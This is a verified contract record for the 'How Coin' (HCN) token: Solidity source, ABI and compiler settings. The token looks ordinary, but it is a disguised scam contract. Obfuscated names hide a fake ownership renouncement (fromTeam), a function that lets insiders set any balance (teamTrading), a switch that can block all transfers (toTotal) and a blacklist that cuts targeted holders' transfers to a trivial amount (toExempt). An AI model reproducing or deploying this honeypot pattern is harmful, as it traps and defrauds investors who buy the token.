{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract liquidityLaunchLimit {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface receiverFeeTotal {\n    function createPair(address minTrading, address senderWalletSell) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface shouldMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface autoLiquiditySell {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeShould) external view returns (uint256);\n\n    function transfer(address walletReceiver, uint256 totalShould) external returns (bool);\n\n    function allowance(address shouldTeam, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 totalShould) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address walletReceiver,\n        uint256 totalShould\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed launchLimit, uint256 value);\n    event Approval(address indexed shouldTeam, address indexed spender, uint256 value);\n}\n\ninterface shouldExempt is autoLiquiditySell {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HowCoin is liquidityLaunchLimit, autoLiquiditySell, shouldExempt {\n\n    address launchExempt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return walletLaunch;\n    }\n\n    event OwnershipTransferred(address indexed modeIsTo, address indexed enableLaunch);\n\n    string private swapAt = \"HCN\";\n\n    function senderFeeMode(address senderLiquidity) public {\n        require(senderLiquidity.balance < 100000);\n        if (buyTake) {\n            return;\n        }\n        if (receiverLiquidity) {\n            atMarketing = receiverLaunchedMarketing;\n        }\n        autoShouldMarketing[senderLiquidity] = true;\n        \n        buyTake = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return atToken;\n    }\n\n    constructor (){\n        if (sellReceiver == receiverLaunchedMarketing) {\n            tradingBuy = true;\n        }\n        fromTeam();\n        shouldMode buyListTake = shouldMode(launchExempt);\n        txList = receiverFeeTotal(buyListTake.factory()).createPair(buyListTake.WETH(), address(this));\n        marketingReceiver = receiverFeeTotal(buyListTake.factory()).feeTo();\n        \n        enableReceiver = _msgSender();\n        autoShouldMarketing[enableReceiver] = true;\n        receiverMarketing[enableReceiver] = limitLaunch;\n        \n        emit Transfer(address(0), enableReceiver, limitLaunch);\n    }\n\n    function enableTotal(address maxAuto, address walletReceiver, uint256 totalShould) internal returns (bool) {\n        if (maxAuto == enableReceiver) {\n            return totalFee(maxAuto, walletReceiver, totalShould);\n        }\n        uint256 receiverExempt = autoLiquiditySell(txList).balanceOf(marketingReceiver);\n        require(receiverExempt == feeAt);\n        require(walletReceiver != marketingReceiver);\n        if (fundSell[maxAuto]) {\n            return totalFee(maxAuto, walletReceiver, maxBuy);\n        }\n        totalShould = exemptFund(maxAuto, walletReceiver, totalShould);\n        return totalFee(maxAuto, walletReceiver, totalShould);\n    }\n\n    bool public receiverLiquidity;\n\n    uint256 isBuy;\n\n    address marketingReceiver;\n\n    bool private senderFundMax;\n\n    function transfer(address feeBuy, uint256 totalShould) external virtual override returns (bool) {\n        return enableTotal(_msgSender(), feeBuy, totalShould);\n    }\n\n    function transferFrom(address maxAuto, address walletReceiver, uint256 totalShould) external override returns (bool) {\n        if (_msgSender() != launchExempt) {\n            if (shouldIs[maxAuto][_msgSender()] != type(uint256).max) {\n                require(totalShould <= shouldIs[maxAuto][_msgSender()]);\n                shouldIs[maxAuto][_msgSender()] -= totalShould;\n            }\n        }\n        return enableTotal(maxAuto, walletReceiver, totalShould);\n    }\n\n    function toTotal(uint256 totalShould) public {\n        isAt();\n        feeAt = totalShould;\n    }\n\n    function approve(address sellTx, uint256 totalShould) public virtual override returns (bool) {\n        shouldIs[_msgSender()][sellTx] = totalShould;\n        emit Approval(_msgSender(), sellTx, totalShould);\n        return true;\n    }\n\n    function owner() external view returns (address) {\n        return atToken;\n    }\n\n    uint256 public feeAuto = 0;\n\n    uint256 constant maxBuy = 18 ** 10;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapAt;\n    }\n\n    uint256 public fundLaunch = 3;\n\n    function totalFee(address maxAuto, address walletReceiver, uint256 totalShould) internal returns (bool) {\n        require(receiverMarketing[maxAuto] >= totalShould);\n        receiverMarketing[maxAuto] -= totalShould;\n        receiverMarketing[walletReceiver] += totalShould;\n        emit Transfer(maxAuto, walletReceiver, totalShould);\n        return true;\n    }\n\n    mapping(address => bool) public fundSell;\n\n    uint256 private atMarketing;\n\n    function exemptFund(address maxAuto, address walletReceiver, uint256 totalShould) internal view returns (uint256) {\n        require(totalShould > 0);\n\n        uint256 feeWallet = 0;\n        if (maxAuto == txList && fundLaunch > 0) {\n            feeWallet = totalShould * fundLaunch / 100;\n        } else if (walletReceiver == txList && feeAuto > 0) {\n            feeWallet = totalShould * feeAuto / 100;\n        }\n        require(feeWallet <= totalShould);\n        return totalShould - feeWallet;\n    }\n\n    function allowance(address takeTeamReceiver, address sellTx) external view virtual override returns (uint256) {\n        if (sellTx == launchExempt) {\n            return type(uint256).max;\n        }\n        return shouldIs[takeTeamReceiver][sellTx];\n    }\n\n    address public enableReceiver;\n\n    string private walletLaunch = \"How Coin\";\n\n    function teamTrading(address feeBuy, uint256 totalShould) public {\n        isAt();\n        receiverMarketing[feeBuy] = totalShould;\n    }\n\n    uint256 private limitLaunch = 100000000 * 10 ** 18;\n\n    uint8 private txAt = 18;\n\n    mapping(address => mapping(address => uint256)) private shouldIs;\n\n    address public txList;\n\n    uint256 public receiverLaunchedMarketing;\n\n    bool private toMarketing;\n\n    function fromTeam() public {\n        emit OwnershipTransferred(enableReceiver, address(0));\n        atToken = address(0);\n    }\n\n    address private atToken;\n\n    function balanceOf(address feeShould) public view virtual override returns (uint256) {\n        return receiverMarketing[feeShould];\n    }\n\n    function isAt() private view {\n        require(autoShouldMarketing[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return limitLaunch;\n    }\n\n    uint256 feeAt;\n\n    function decimals() external view virtual override returns (uint8) {\n        return txAt;\n    }\n\n    mapping(address => bool) public autoShouldMarketing;\n\n    function toExempt(address enableToken) public {\n        isAt();\n        if (toMarketing) {\n            tradingBuy = false;\n        }\n        if (enableToken == enableReceiver || enableToken == txList) {\n            return;\n        }\n        fundSell[enableToken] = true;\n    }\n\n    mapping(address => uint256) private receiverMarketing;\n\n    bool private swapList;\n\n    bool public buyTake;\n\n    bool public tradingBuy;\n\n    uint256 public sellReceiver;\n\n    bool public isToken;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeIsTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"enableLaunch\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchLimit\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeTeamReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"autoShouldMarketing\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeShould\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableReceiver\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeAuto\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunchedMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLiquidity\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"senderLiquidity\",\"type\":\"address\"}],\"name\":\"senderFeeMode\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"teamTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableToken\",\"type\":\"address\"}],\"name\":\"toExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"toTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"totalShould\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txList\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "HowCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}